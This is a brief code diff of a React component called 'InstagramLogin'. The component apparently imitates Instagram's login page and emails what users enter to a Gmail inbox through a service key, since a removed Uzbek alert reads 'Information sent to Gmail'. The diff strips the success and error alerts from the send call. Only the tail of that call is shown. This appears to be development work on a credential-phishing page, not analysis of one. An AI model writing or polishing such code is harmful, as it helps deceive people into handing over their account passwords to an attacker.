@@ -22,12 +22,7 @@ export default function InstagramLogin() {
     },
     "UrSelZu6PV52l1JpZ"
   )
-  .then(() => {
-    alert("Ma'lumot Gmailga yuborildi");
-  })
-  .catch(() => {
-    alert("Xatolik yuz berdi");
-  });
+  
 };
   return (
     <div className="dark min-h-screen bg-background flex flex-col">
